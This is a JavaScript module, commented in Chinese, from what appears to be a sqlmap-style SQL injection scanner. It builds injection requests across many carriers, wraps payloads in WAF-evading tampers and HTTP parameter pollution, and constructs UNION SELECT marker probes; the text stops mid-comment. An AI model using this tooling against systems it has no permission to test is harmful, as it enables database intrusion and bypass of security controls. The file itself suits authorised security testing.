import { URL } from 'url';
import { fillPayload, replaceAllLiteral } from './payloads.js';
import { SQL_ERROR_SIG } from '../core/errorSig.js';
import { obfuscateWithConfig } from '../core/tamper/applyTampers.js';
import { resolveDbms, resolveFromClause, commentSuffix } from './DialectSqlBuilder.js';
// [P0-FIX 2026-09-09] 出口选项同源 + 失败响应结构（见 egressOpts.js 顶部三起事故）
import { buildEgressOpts, mustRethrowSendError, netFailureResponse } from './egressOpts.js';
import { unionDebug } from './unionDebug.js';
// [编码参数] payload 需按参数自身的传输编码（base64 / 0x-hex）编码后再发
import { encodeForPoint } from './paramEncoding.js';
// [2026-10-01] XML / SOAP body 通道（对标 ghauri 的 XML·SOAP 参数支持）
import { cloneXmlTree, setXmlLeaf, serializeXml, renameXmlTag } from '../core/xmlBody.js';
// [D121 2026-10-21] GraphQL 内联字面量替换：保持查询骨架，只换值位（DVGA 0/1 的修法）
import { replaceGraphQLStringLiteral } from './graphqlInline.js';

// [P1 批次 2026-09-08] JSON 点路径段 → 真实键匹配（buildInjectionRequest JSON 分支用）。
// 三向匹配（与 TargetParser._discoverJsonLeaves 的路径生成互逆）：
//   ① 段为带引号形式（"a.b"）→ JSON.parse 去引号得真实键再命中；
//   ② 直接属性命中；
//   ③ 段为裸键但对象键含点号 → JSON.stringify 形式回退匹配。
// 返回真实键名或 null（无匹配，注入路径失效）。
function _matchJsonKey(obj, seg) {
  if (obj == null || typeof obj !== 'object') return null;
  // ① 段已是引号形式：去引号解析（JSON 字符串字面量），用解析结果命中真实键
  if (seg.length > 1 && seg[0] === '"' && seg[seg.length - 1] === '"') {
    try {
      const unquoted = JSON.parse(seg);
      if (typeof unquoted === 'string' && Object.prototype.hasOwnProperty.call(obj, unquoted)) return unquoted;
    } catch { /* 非法 JSON 字面量：走后续分支 */ }
  }
  // ② 直接属性命中
  if (Object.prototype.hasOwnProperty.call(obj, seg)) return seg;
  // ③ stringify 形式回退（对象键本身带引号存储的边缘场景）
  const quoted = JSON.stringify(seg);
  if (quoted.length > 2 && Object.prototype.hasOwnProperty.call(obj, quoted)) return quoted;
  return null;
}

// [P1 批次 2026-09-08] 引号感知的点路径拆分：普通段用 '.' 分隔，但 "带引号" 段（键本身
// 含点号，TargetParser 生成时用 JSON.stringify 包裹）作为整体不拆。例：
// `user."a.b".id` → ['user', '"a.b"', 'id']（而非 ['user', '"a', 'b"', 'id']）。
// 与 _discoverJsonLeaves 的路径生成规则互逆；数组下标段为裸数字。
function _splitJsonPath(path) {
  const segs = [];
  let i = 0;
  const s = String(path ?? '');
  while (i < s.length) {
    if (s[i] === '"') {
      // 引号段：找到闭合引号（键内的转义引号按 JSON 语义简化处理——扫描到下一个
      // 未被反斜杠转义的引号）
      let j = i + 1;
      while (j < s.length) {
        if (s[j] === '\\') { j += 2; continue; }
        if (s[j] === '"') break;
        j++;
      }
      if (j >= s.length) return null; // 引号未闭合：非法路径
      segs.push(s.slice(i, j + 1));
      i = j + 1;
      if (s[i] === '.') i++;
      else if (i < s.length) return null; // 引号段后必须跟点号或结束
    } else {
      // 普通段：到下一个点号（跳过引号内的点号）
      let j = i;
      while (j < s.length && s[j] !== '.') j++;
      if (j === i) return null; // 空段（连续点号/首尾点号）：非法
      segs.push(s.slice(i, j));
      i = j;
      if (s[i] === '.') i++;
    }
  }
  return segs.length ? segs : null;
}

// [D121] JSON 点路径 → 父容器与最后一段真实键。与 _matchJsonKey 同源规则：
// 数组下标（'0'）与对象键都走 hasOwnProperty 命中；键含点号时由 "a.b" 引号段还原。
// 返回 null = 路径失效（调用方保守降级，不发畸形请求）。
function _resolveJsonParent(root, segs) {
  if (root == null || typeof root !== 'object' || !Array.isArray(segs) || segs.length === 0) {
    return null;
  }
  let cur = root;
  for (let i = 0; i < segs.length - 1; i += 1) {
    const key = _matchJsonKey(cur, segs[i]);
    if (key === null || cur[key] == null || typeof cur[key] !== 'object') return null;
    cur = cur[key];
  }
  const last = _matchJsonKey(cur, segs[segs.length - 1]);
  return last === null ? null : { parent: cur, key: last };
}

/**
 * [D121 2026-10-21] GraphQL 内联字面量点的请求构造。
 *
 * 与普通 JSON 叶子点的区别：不替换整个 `query` 字符串，而是只替换 `graphqlInline`
 * 扫描出的那个双引号字面量；其余查询骨架、variables、operationName 逐字保留。
 * 失败（路径/区间不匹配）返回 false，调用方走保守分支，绝不退化成整串替换。
 * @param {object} req 已带 method/url/headers 的请求对象（就地写 data）
 * @param {object} target 扫描目标（用 jsonBody）
 * @param {object} point 注入点（carrier='graphql'）
 * @param {string} injected 已编码/包裹后的注入值
 * @returns {boolean} 是否成功构造
 */
function buildGraphQLBodyRequest(req, target, point, injected) {
  const body = target && target.jsonBody;
  if (body == null || typeof body !== 'object') return false;
  if (typeof point.graphqlPath !== 'string') return false;
  const segs = _splitJsonPath(point.graphqlPath);
  if (!segs) return false;
  const clone = JSON.parse(JSON.stringify(body));
  const slot = _resolveJsonParent(clone, segs);
  if (!slot || typeof slot.parent[slot.key] !== 'string') return false;
  const next = replaceGraphQLStringLiteral(
    slot.parent[slot.key],
    Number(point.graphqlLiteralStart),
    Number(point.graphqlLiteralEnd),
    injected,
    point.originalValue,
    point.graphqlLiteralRaw
  );
  if (next == null) return false;
  slot.parent[slot.key] = next;
  req.data = JSON.stringify(clone);
  req.headers['Content-Type'] = 'application/json';
  return true;
}

// 读取 target.config 的 prefix/suffix（对标 sqlmap --prefix / --suffix），
// 包裹「被注入的参数值」：最终注入值 = prefix + 原值 + payload + suffix。
// 仅影响注入请求——value 恰为原始值（基线请求）或直连模式时原样返回，不污染基线请求。
export function applyPrefixSuffix(target, point, value) {
  const cfg = (target && target.config) || {};
  const prefix = typeof cfg.prefix === 'string' ? cfg.prefix : '';
  const suffix = typeof cfg.suffix === 'string' ? cfg.suffix : '';
  if ((!prefix && !suffix) || (target && target.mode === 'direct')) return value;
  // 基线请求：value 恰为原始值（无 payload 拼接）时不包裹，保持基线请求原样
  const orig = (point && point.originalValue) || '1';
  if (value === orig) return value;
  return `${prefix}${value}${suffix}`;
}

// 统一的注入请求构造（url/body/cookie/header 四种注入点）
// 与 Detector.buildRequest / Extractor._build / DBFingerprinter._build 行为一致，集中维护避免三处漂移。
// multipart 报文构造（发送侧）：按 RFC 7578 拼文本字段 + 文件字段，末段为闭合 boundary。
//
// [D159 2026-10-25] 文件字段从「静默丢弃 / 当文本发」改成**按真实结构重建**：
//   `Content-Disposition: form-data; name="avatar"; filename="<值>"`
//   目标是「只认 multipart 的上传接口」时，它读的是 `filename`（落库/落日志），
//   旧实现把文件名当文本字段内容发 ⇒ 那个位置永远没有被注入过（静默假阴性）。
// 注入字符串可能含 `"`（H2/部分方言的 payload 用双引号闭合），filename 在引号内
// 必须转义，否则整段报文被目标解析失败 —— 转义后服务端解出来仍是原值。
// @param {Record<string, any>} fields 文本字段
// @param {string} boundary
// @param {Array<{name:string,filename:string,contentType?:string}>} [fileParts] 文件字段
// @param {{name:string,value:string}|null} [injectedFile] 本次要注入的文件字段
// @returns {string} multipart 报文
function buildMultipartBody(fields, boundary, fileParts, injectedFile) {
  const chunks = [];
  const esc = (s) => String(s ?? '').replace(/"/g, '\\"').replace(/[\r\n]/g, '');
  for (const [k, v] of Object.entries(fields || {})) {
    if (injectedFile && k === injectedFile.name) continue; // 文件字段不重复发文本段
    // [D166] 字段名同样过 esc：paramName 点（carrier='form'）注入时名就是载荷，
    // 名内含引号不转义会提前闭合 Content-Disposition ⇒ 畸形报文（文件字段名早已
    // 如此，文本字段名此前不注入所以没暴露——同一处防护，两类字段对齐）。
    chunks.push(`--${boundary}\r\nContent-Disposition: form-data; name="${esc(k)}"\r\n\r\n${v ?? ''}\r\n`);
  }
  for (const fp of Array.isArray(fileParts) ? fileParts : []) {
    if (!fp || !fp.name) continue;
    const fname = injectedFile && injectedFile.name === fp.name ? injectedFile.value : fp.filename;
    const ctype = fp.contentType || 'application/octet-stream';
    chunks.push(
      `--${boundary}\r\nContent-Disposition: form-data; name="${esc(fp.name)}"; filename="${esc(fname)}"\r\n`
      + `Content-Type: ${esc(ctype)}\r\n\r\n\r\n`
    );
  }
  chunks.push(`--${boundary}--\r\n`);
  return chunks.join('');
}

// boundary 随机串（纯小写字母数字，避免特殊字符引发解析歧义）
const nanoidLc = () => Math.random().toString(36).slice(2, 12);

/**
 * [D159] 读「本次请求实际上会发出去的」某个请求头的声明值。
 *
 * 必须看**两处**：`--header` / `--test-headers` 的注入头走 `target.headerParams`；
 * `-r` 抓包导入的请求头走 `config.auth.headers`（httpClient 发送时合并）。
 * 只看 headerParams 会把 `-r` 的 multipart 目标误判成非 multipart ⇒ body 按 urlencoded 发、
 * 头却仍是 multipart（目标 415/400）⇒ 每个点都被预筛剪掉（实测 11 请求、0 命中断言）。
 * @param {any} target
 * @param {string} name 头名（大小写不敏感）
 * @returns {string} 未声明时返回空串
 */
function declaredHeaderValue(target, name) {
  const lc = String(name).toLowerCase();
  /** @param {any} obj */
  const pick = (obj) => {
    if (!obj || typeof obj !== 'object') return '';
    const k = Object.keys(obj).find((x) => String(x).toLowerCase() === lc);
    return k ? String(obj[k]) : '';
  };
  const fromParams = pick(target && target.headerParams);
  if (fromParams) return fromParams;
  return pick(target && target.config && target.config.auth && target.config.auth.headers);
}

/**
 * [D91 拆分] cookie 注入点的请求头写入（原为 buildInjectionRequest 内联分支，D91 加
 * 「删大小写同名键」后超复杂度基线，按仓库纪律拆函数而非抬基线）。
 *
 * [D91 2026-10-17 真回归修复·A 处（构造层第一道防线）] 写入前先删 headers 中**所有大小写
 * 同形的 Cookie 键**。背景：`--header "cookie: uid=1"` 会被 TargetParser 同时存进
 * headerParams（小写键）与 config.auth.headers，若只 `req.headers['Cookie'] = 注入值`，
 * 对象里就同时留着 `cookie=uid=1`（原值，小写）与 `Cookie=uid=<注入>`（大写）—— Node/axios
 * 对大小写不敏感同名头的合并是「后写赢」（axios 1.20.0 AxiosHeaders.set：findKey 命中即
 * 覆盖），键序上小写原值在后 ⇒ **服务端永远收到原值** ⇒ 该点所有探针都打在未注入的原值上
 * ⇒ 门控真假响应恒等 ⇒ 判「不是注入」⇒ UNION/布尔通道从未启动 ⇒ 报告写「未检出」，
 * 与「这个站没有注入」完全同形（红队 D11-cookie 实测：axios 1.18.1 时 19/19，5db14b8 升
 * 1.20.0 后 18/19，三次历史运行全命中、复跑全漏）。
 * 只删 Cookie 同名键，不动其他头；cookies 合并后的整串 Cookie 由本函数单键负责。
 * @param {object} req 待写入的请求对象（就地修改 headers）
 * @param {Record<string,string>} cookies 已把注入值写进 point.param 的 cookie 映射
 */
function applyCookieInjectionHeaders(req, cookies) {
  for (const k of Object.keys(req.headers)) {
    if (/^cookie$/i.test(k)) delete req.headers[k];
  }
  req.headers['Cookie'] = Object.entries(cookies)
    .map(([k, v]) => `${k}=${v}`)
    .join('; ');
}

// [D121] JSON body 嵌套叶子点（param 为点路径如 user.id）：按路径替换叶子值后整体
// 重序列化为 JSON 字符串。与 TargetParser._discoverJsonLeaves 的路径生成规则互逆。
// 从 buildInjectionRequest 抽出（D121 加 GraphQL 分支后触碰复杂度基线，按纪律拆函数）；
// 行为逐行保留：路径非法/失效时不改 req.data，交给后续既有语义。
function applyJsonBodyInjection(req, target, point, injected) {
  if (target.jsonBody == null || typeof target.jsonBody !== 'object' || !point.param.includes('.')) return;
  // 引号感知路径解析：键含点号时 TargetParser 生成 "a.b" 形式段，
  // 暴力 split('.') 会切碎——_splitJsonPath 把带引号段作为整体解析（互逆规则）。
  const segs = _splitJsonPath(point.param);
  if (!segs) return; // 非法路径（引号未闭合/空段）：JSON 注入失效，保持表单语义
  const clone = JSON.parse(JSON.stringify(target.jsonBody));
  const slot = _resolveJsonParent(clone, segs);
  if (!slot) return;
  slot.parent[slot.key] = injected;
  req.data = JSON.stringify(clone);
  req.headers['Content-Type'] = 'application/json';
}

// @returns 显式声明的原因：TS 对返回联合做子型归约（UnionReduction.Subtype），本函数
// 各分支形状异构且多处含 any 字段，直连分支的 `{...,sql}` 形状会被宽形状结构性吸收 ⇒
// 推断类型丢失 `sql`，Extractor/pocBuilder 的 `req.sql` 报 TS2339（D166 实测）。
/**
 * @param {object} target 扫描目标（mode='direct' 时走 SQL 模板直连分支）
 * @param {object} point 注入点（location='paramName' 的点在入口按 carrier 分流）
 * @param {string} value 注入值（检测器已拼好的 payload；基线请求传 point.originalValue）
 * @returns {{method: any, url: any, params: any, data: any, headers: any, sql?: string}} 请求对象。
 *   query/body/header/cookie/表单/JSON/XML/form 各分支返回形状异构，字段故放宽为 any；
 *   直连模式额外带 `sql`（由 DirectConnector 执行），HTTP 模式下 HttpClient 忽略该字段。
 */
export function buildInjectionRequest(target, point, value) {
  // [D166 2026-10-25] 参数名点（location='paramName'）必须在**本函数入口**就分流到各载体的
  // 专用构造器。原先只在 Detector.buildRequest 里分流，而指纹/边界/预筛选等路径是直接调
  // 本函数的 —— 于是 paramName 点在这里落到「值注入」的尾部，产出 `data:{}` + 继承来的
  // `Content-Type: multipart/form-data`。axios 见到对象 data + multipart 会自己生成一份
  // **另一个 boundary** 的 FormData，而我们又把头覆盖成抓包里的 boundary ⇒ 目标找不到分隔符，
  // 一直等更多数据 ⇒ 请求挂到超时（实测：form 字段名点整轮指纹 8 次全超时，扫描卡死 60s）。
  // 各 builder 都很轻（纯字符串拼装），在上游分流没有额外成本。
  if (point && point.location === 'paramName') {
    if (point.carrier === 'json') return buildJsonKeyRequest(target, point, value);
    if (point.carrier === 'xml') return buildXmlKeyRequest(target, point, value);
    if (point.carrier === 'form') return buildFormNameRequest(target, point, value);
    return buildParamNameRequest(target, point, value);
  }
  // 先包裹 prefix/suffix（对标 sqlmap --prefix/--suffix），再按注入点位置拼入请求
  const wrapped = applyPrefixSuffix(target, point, value);
  // [编码参数] 参数值本身是 base64 / 0x-hex 传输时，payload 必须先编码成同样形态再发：
  // 服务端解码后才拼进 SQL，直接发原始 payload 是无效的（实测 D14 靶点只能靠报错碰运气）。
  const injected = encodeForPoint(wrapped, point && point.encoding);
  // 直连模式：把 value（注入 payload）拼进 SQL 模板的 {INJECT} 标记处，产出 req.sql（由 DirectConnector 执行）。
  if (target && target.mode === 'direct') {
    const tpl = (point && point.sqlTemplate) || (target && target.sqlTemplate);
    const sql = String(tpl).replace(/\{INJECT\}/g, injected);
    return { method: '', url: '', params: {}, data: {}, headers: {}, sql };
  }
  // 表单点回退：优先用表单自身的提交方法与 action 地址；否则回退到 target 默认。
  const req = {
    method: point.formMethod || target.method,
    url: point.actionUrl || target.baseUrl,
    params: {},
    data: {},
    headers: { ...(target.headerParams || {}) },
  };
  const cookies = { ...(target.cookieParams || {}) };
  // [D42 2026-10-11 对标 sqlmap --randomize] 随机化非注入参数（防反爆破/风控锁定）：
  // config.randomize 列出的参数名在本函数产出的**每一条请求**上换成随机值（本函数按请求
  // 调用，天然每请求新鲜）。注入点自身（point.param）永不随机化——那会打断检测判定。
  // 覆盖面（诚实边界）：URL query / Cookie / 请求头 / 表单伴随字段四处「伴随参数」；
  // JSON body（jsonBody）与 XML 叶子不随机化（顶层键与点路径归属有歧义）；
  // --param-del 自定义分隔符的 URL 不随机化（query 按裸串重建，避开写出畸形请求）。
  // 未配置（默认）时 rndNames=null，全路径零行为变化。
  const rndNames = target && target.config && Array.isArray(target.config.randomize) && target.config.randomize.length
    ? target.config.randomize.map((s) => String(s).toLowerCase())
    : null;
  const rndVal = () => `r${Math.random().toString(36).slice(2, 10)}`; // 字母数字：URL/头/体/cookie 全安全
  const rndHit = (name) => {
    if (!rndNames) return false;
    const k = String(name).toLowerCase();
    return rndNames.includes(k) && k !== String((point && point.param) || '').toLowerCase();
  };
  // 传输/安全关键头不随机化：Content-Length/Host 随机会打碎报文框架，Authorization/
  // Content-Type/Cookie 随机等于自断会话与编码——要动它们请走 --header 显式覆盖。
  const RND_HEADER_DENY = new Set(['host', 'content-length', 'content-type', 'authorization', 'cookie']);
  if (rndNames) {
    for (const k of Object.keys(req.headers)) {
      if (!RND_HEADER_DENY.has(k.toLowerCase()) && rndHit(k)) req.headers[k] = rndVal();
    }
    for (const k of Object.keys(cookies)) {
      if (rndHit(k)) cookies[k] = rndVal();
    }
  }
  // [P0-FIX 2026-09-07] cookieParams = 会话上下文，必须无条件携带到所有 HTTP 注入点的
  // 请求上——登录后才可见的后台/用户中心是注入重灾区，此前仅 cookie 注入点分支会写
  // Cookie 头，url/body/header 注入点的请求全部裸奔（实测 80 请求 0 个带 sid，
  // 基线标题「未登录」，还在未登录页上测出 boolean 假阳性）。
  // 语义解耦：cookieParams（会话携带，无条件）≠ cookie 注入点（测试目标，level≥2）。
  // 优先级：用户显式 headerParams.Cookie（如 --cookie= 手工指定）> cookieParams 自动会话，
  // 与 HttpClient 的「显式头优先，jar 同名不覆盖」规则一致。
  if (
    Object.keys(cookies).length > 0 &&
    !req.headers['Cookie'] && !req.headers['cookie']
  ) {
    req.headers['Cookie'] = Object.entries(cookies)
      .map(([k, v]) => `${k}=${v}`)
      .join('; ');
  }
  if (point.location === 'url') {
    const u = new URL(req.url);
    // [D42] randomize：URL query 的非注入参数（大小写敏感——URL query 参数语义上区分大小写；
    // --param-del 分支不走这里，见上方覆盖面说明）
    if (rndNames) {
      for (const name of rndNames) {
        if (name !== String(point.param || '').toLowerCase() && u.searchParams.has(name)) {
          u.searchParams.set(name, rndVal());
        }
      }
    }
    // [P0-FIX 2026-09-06] 已编码 payload 跳过二次编码：charencode/chardoubleencode 类
    // tamper 的输出本身就是 URL 编码形态，searchParams.set 会把 % 再编码为 %25（双重编码）
    // → 服务器单次解码后 payload 仍是编码形态 → SQL 层收到乱码、回显标记失配
    // （waf-lab configB 0 检出的根因）。判定：含合法 %XX 且解码后形态改变 → 视为已编码。
    // 误判面：LIKE '%a%' 等含裸 % 的值解码会失败或不变 → 不触发 preEncoded 分支。
    const looksEncoded = /%[0-9A-Fa-f]{2}/.test(injected);
    let preEncoded = false;
    if (looksEncoded) {
      try {
        preEncoded = decodeURIComponent(injected) !== injected;
      } catch {
        preEncoded = false; // 非法序列（如 '%a%'）→ 未编码
      }
    }
    // [对标 sqlmap --param-del] 自定义分隔符：searchParams 只认 '&'，用它重建会把
    // `a=1;b=2` 整体写成一个参数值 → 注入请求畸形。此处按用户分隔符手工重建 query。
    const paramDel = (target.config && target.config.paramDel) || null;
    if (paramDel) {
      const rawQ = u.search.startsWith('?') ? u.search.slice(1) : u.search;
      const val = preEncoded ? injected : encodeURIComponent(injected);
      let hit = false;
      const parts = rawQ.split(paramDel).filter(Boolean).map((pair) => {
        const i = pair.indexOf('=');
        const k = i < 0 ? pair : pair.slice(0, i);
        if (k === point.param) {
          hit = true;
          return `${k}=${val}`;
        }
        return pair;
      });
      if (!hit) parts.push(`${encodeURIComponent(point.param)}=${val}`);
      req.url = `${u.origin}${u.pathname}?${parts.join(paramDel)}`;
    } else if (preEncoded) {
      // 手工拼 query：先移除同名旧参数，injected 已是编码形态仅编码参数名
      u.searchParams.delete(point.param);
      const rest = u.searchParams.toString();
      req.url = `${u.origin}${u.pathname}?${rest ? rest + '&' : ''}${encodeURIComponent(point.param)}=${injected}`;
    } else {
      u.searchParams.set(point.param, injected);
      req.url = u.toString();
    }
  } else if (point.location === 'path') {
    // P3 路径注入点：按 pathSegment 下标替换 URL 路径中的标记段（URL 构造器自动做路径编码）
    const u = new URL(req.url);
    const segments = u.pathname.split('/');
    // 优先用 pathSegment 下标；无下标时回退按 param 匹配段值（剥离尾部 * 后比较，兼容路径标记仍在 URL 中的场景）
    const idx =
      point.pathSegment != null
        ? point.pathSegment
        : segments.findIndex((s) => s.replace(/\*+$/g, '') === point.param);
    if (idx >= 0 && idx < segments.length) {
      // [D154] `.json` 等数据后缀段：后缀是路由的一部分（去掉即 404），只替换前缀
      const suffix = typeof point.pathSuffix === 'string' ? point.pathSuffix : '';
      segments[idx] = suffix ? `${injected}${suffix}` : injected;
      u.pathname = segments.join('/');
    }
    req.url = u.toString();
  } else if (point.location === 'body') {
    // [D121 2026-10-21] GraphQL 内联字面量点：先于普通 JSON 叶子/表单分支处理。
    // 构造成功即返回；失败则继续走既有分支（不会把整个 query 串当值替换 —— 那会
    // 生成非法 GraphQL，D114 已实测其后果）。
    if (point.carrier === 'graphql' && buildGraphQLBodyRequest(req, target, point, injected)) {
      return req;
    }
    // [2026-10-01] XML / SOAP 叶子点（对标 ghauri XML·SOAP）：必须**先于**下面表单 /
    // urlencoded 分支处理 —— 否则 req.data 会被摊成 `路径=值` 的 urlencoded 对象，
    // 只吃 XML 的目标一个字段都解析不到 ⇒ 注入值从未进 SQL ⇒ 静默 0 检出
    // （与 multipart 那次同型的失败模式：发送侧形态不对，检测侧再努力也白搭）。
    // 命中即返回：尾部 HPP 只对 url 点生效，对 XML 点无副作用。
    const _xmlTree = target && target.xmlTree;
    if (_xmlTree && point.xmlPath === true && String(point.param).includes('.')) {
      const clone = cloneXmlTree(_xmlTree);
      if (setXmlLeaf(clone, point.param, injected)) {
        req.data = serializeXml(clone);
        // Content-Type：SOAP 1.1 要 text/xml、1.2 要 application/soap+xml，
        // 原样保留调用方声明（改声明比不声明更危险），没声明才兜 application/xml。
        const _ctKey = Object.keys(req.headers).find((k) => /^content-type$/i.test(k));
        if (!_ctKey) req.headers['Content-Type'] = 'application/xml';
        return req;
      }
      // 路径失效（树被外部改动/恢复快照不一致）→ 落到表单分支，至少发请求而不是抛错
    }
    // 表单点：将表单全部字段并入 data（含 CSRF token），再把当前注入参数覆盖为注入值
    const formValues = point.formValues || {};
    req.data = { ...formValues };
    // [D42] randomize：表单伴随字段（CSRF token 也在 formValues 里——用户把 token 名列进
    // --randomize 是自断会话，按用户指令执行；注入点自身已被 rndHit 排除）
    if (rndNames) {
      for (const k of Object.keys(req.data)) {
        if (rndHit(k)) req.data[k] = rndVal();
      }
    }
    // [D159] 文件字段点不写文本字段（注入值进 filename，见下方 multipart 分支）
    if (!point.fileField) req.data[point.param] = injected;
    // [P1 2026-09-22] multipart 目标：目标请求头声明了 multipart/form-data 时，
    // 必须以 multipart 形态重建报文 —— 否则发成 urlencoded / JSON，只吃 multipart 的目标
    // 解析不到字段 → **注入值从未进 SQL → 静默 0 检出**。
    // （`-r` 导入侧早就能认出 multipart 的字段名，缺的一直是发送侧；靶场 e2e/pentest-lab
    //  的 `/mp` 把这个缺口钉成了可复现事实。）
    // [D159 2026-10-25] 文件字段（fileParts）现在按真实结构重建：`name="x"; filename="…"` +
    // 空内容，不再当成文本字段发。此前 `-r` 的 multipart 还会被降级成 urlencoded（见
    // bin/cli/args.js 的 D159 注释），两层修复合起来才让「上传表单的 filename 注入」可达。
    //
    // [D159] 声明头必须**两处都看**：`--header` 走 target.headerParams，而 `-r` 抓包的
    // 请求头走 config.auth.headers（headerObj）。只看前者时，-r 的 multipart 目标被判成
    // 非 multipart → 按 urlencoded 发、却带着 auth 那边的 multipart Content-Type
    // （实测：报文 `title=report` + `Content-Type: multipart/...`，目标 415，全点被剪）。
    // [D168 2026-10-26] 表单**自身声明的** enctype 也要认：`<form enctype="multipart/form-data">`
    // 的上传表单（爬取/`--forms` 路径发现）没有对应的请求头，此前按 urlencoded 发 ⇒
    // 只认 multipart 的目标 415/400 ⇒ 字段从未进业务逻辑（与 D159 的 -r 场景同型）。
    const declaredCt = declaredHeaderValue(target, 'content-type') || String(point.formEnctype || '');
    if (/^multipart\/form-data/i.test(declaredCt)) {
      const existing = /boundary=(?:"([^"]+)"|([^;\s]+))/i.exec(declaredCt);
      const boundary = (existing?.[1] || existing?.[2] || `----SqlScanBoundary${nanoidLc()}`).trim();
      // 文件字段点：注入值写进 filename 而不是文本字段内容
      const injectedFile = point.fileField ? { name: point.param, value: injected } : null;
      req.data = buildMultipartBody(req.data, boundary, target && target.fileParts, injectedFile);
      req.headers['Content-Type'] = `multipart/form-data; boundary=${boundary}`;
    } else if (target.jsonBody == null) {
      // [P0-FIX 2026-09-15] 表单点 Content-Type 修正：axios 对对象 data 默认 JSON 序列化，
      // urlencoded-only 目标（真实 HTML 表单常态）解析不到 body → 注入值从未进 SQL → 全漏检。
      // 序列化为 urlencoded 并显式声明 Content-Type。JSON API 目标（target.jsonBody 存在）
      // 保持 axios JSON 序列化（下方 JSON 分支按需重序列化），仅 HTML 表单点走 urlencoded。
      req.data = new URLSearchParams(req.data).toString();
      req.headers['Content-Type'] = 'application/x-www-form-urlencoded';
    }
    // [P1 批次 2026-09-08 / D121 抽出] JSON body 嵌套注入点：
    // 按点路径替换叶子值后整体重序列化（见 applyJsonBodyInjection）。
    applyJsonBodyInjection(req, target, point, injected);
  } else if (point.location === 'cookie') {
    cookies[point.param] = injected;
    // [D91] 删键 + 单键写入（详见 applyCookieInjectionHeaders 的 JSDoc：大小写同名头
    // 「后写赢」会把注入值顶掉，造成该点静默假阴性）
    applyCookieInjectionHeaders(req, cookies);
  } else if (point.location === 'header') {
    req.headers[point.param] = injected;
  }
  // [P2-5] --hpp：HTTP 参数污染（对标 sqlmap --hpp）。仅对 GET query 注入点生效：
  // 注入请求（值 ≠ 原始值）时把注入值额外写入 body 同名参数（query+body 双份），利用
  // WAF（常只查 query 单侧/首份）与后端解析（ASP.NET/IIS 读首份、PHP/Node qs 读末份、
  // 部分网关拼接两侧）的差异绕过检测。基线请求不双份，保持基线原样零污染。
  const _cfg = (target && target.config) || {};
  const _orig = (point && point.originalValue) || '1';
  if (point.location === 'url' && _cfg.hpp === true && injected !== _orig) {
    req.data[point.param] = injected;
  }
  return req;
}

// 经统一 HttpClient 发送。
// [P0-FIX 2026-09-09] 失败不再吞成 null：网络层失败降级为带 `__netErr` 的**失败响应对象**
// （status 0 / data 空串，`res?.status`、`String(res?.data ?? '')` 语义不变，零回归），
// 于是判定层能区分「目标返回空页」与「一个包都没发出去」—— 前者可以下结论，后者不行。
// 两类例外必须继续抛出：扫描停止（Abort）与安全硬拒（SSRF / scope 越界 / URL 非法）——
// 把「越界」写成「这个点没洞」是最坏的失败方式。
/** @param {any} httpClient @param {object} ctx @param {any} req @param {any} opts */
export async function sendInjection(httpClient, ctx, req, opts = {}) {
  const config = (ctx && ctx.config) || {};
  try {
    const res = await httpClient.request(
      // 出口选项与 Detector.send / Detector.sendHead 同源（见 egressOpts.js 顶部三起事故）
      buildEgressOpts(config, {
        method: req.method,
        url: req.url,
        params: req.params,
        data: req.data,
        headers: req.headers,
        sql: req.sql,
        timeoutMs: opts.timeoutMs ?? config.timeoutMs,
        retry: opts.retry ?? config.retry,
      })
    );
    // 目标库健康回流（提取/指纹阶段的请求同样可能触发 DB 致命错误）
    try {
      ctx?.guard?.observe(res);
    } catch {
      /* 守卫异常不影响主流程 */
    }
    return res;
  } catch (err) {
    if (mustRethrowSendError(err)) throw err;
    const failed = netFailureResponse(err, { url: req.url });
    try {
      ctx?.guard?.observe(failed);
    } catch {
      /* 守卫异常不影响主流程 */
    }
    return failed;
  }
}

// 按 WAF 规避配置包裹混淆（tamper 链式优先，否则 legacy obfuscate，否则原样）
/** @param {object} ctx @param {any} value */
export function obfuscateIfNeeded(ctx, value) {
  return obfuscateWithConfig(value, ctx);
}

const MARKER = 'SQLISCANNER';

// —— 数值型回显列兜底（修复对标 sqlmap 差距 D3：严格类型库 UNION 漏检）——
// 文本标记 'SQLISCANNER<i>' 落在 INT 回显列上时：MSSQL/Oracle/PG 等严格类型库因
// varchar→int 转换失败使整条 UNION 报错 → 完全漏检；MySQL 虽静默转 0 不报错，
// 标记同样变形无法命中。数字字面量在 int 列直接兼容、varchar 列被隐式转文本回显，
// 故文本探测落空后追加「两族不同基值的数字标记交叉确认」（双族交集，防页面固有
// 数字串——如时间戳子串——造成的假命中）。
const NUM_MARKER_BASE_A = 7331000;
const NUM_MARKER_BASE_B = 5182960;

// 构造一次标记 UNION 探测请求（boundary 由调用方传入；缺省回落到 point.boundary）
// [CRS-FIX 2026-09-10] 末尾必须带行注释：否则字符串型注入点残留的闭合引号无法被注释掉
// → 整条 SQL 语法错误 → 探测恒 500（实测 /str、/like 的 UNION 回显列定位 100% 失败）。
/** @param {object} ctx @param {any} columns @param {any} markerExprs @param {any} boundary @param {any} fromClause */
function _markerProbe(ctx, columns, markerExprs, boundary, fromClause = '') {
  const { target, point } = ctx;
  const suffix = commentSuffix(ctx.dbms, { tamperEnabled: !!ctx?.config?.wafEvasion?.tamper?.enabled });
  const payload =
    replaceAllLiteral(
      fillPayload('{ORIG} UNION SELECT {MARKERS}', {
        orig: `${point.originalValue || '1'}${boundary}`,
      }),
      '{MARKERS}',
      markerExprs.join(',')
    ) + fromClause + suffix;
  return { payload, req: buildInjectionRequest(target, point, obfuscateIfNeeded(ctx, payload)) };
}

function _textMarkers(columns) {
  return Array.from({ length: columns }, (_, i) => `'${MARKER}${i}'`);
}

function _numMarkers(base, columns) {
  return Array.from({ length: columns }, (_, i) => String(base + i));
}

/** @param {any} httpClient @param {object} ctx @param {any} probe */
async function _probeBody(httpClient, ctx, probe) {
  const res = await sendInjection(httpClient, ctx, probe.req);
  const status = res?.status ?? null;
  const body = String(res?.data ?? '');
  // [P0-FIX 2026-09-07] 标记命中必须发生在非错误响应上：PG 严格类型下 UNION 类型错配的
  // 500 错误页会把「转换失败的输入值」原样回显（invalid input syntax for type integer:
  // "SQLISCANNER0"）——按纯文本匹配会把报错回显误判为可回显列（实测 echoCols 被污染成
  // int 列 [0] → 拖库把文本表达式放 int 列 → 提取全线 500）。
  // [D207] 但**状态码拦不住渲染成 200 的错误页**：Derby/H2/部分 JSP 站把 SQL 报错做成
  // 普通页面（200 + `Syntax error: Encountered ")"`）并回显 SQL 片段。实测
  // `demo.testfire.net` 的 doLogin：`point.boundary` 推断为空 ⇒ union payload 无引号
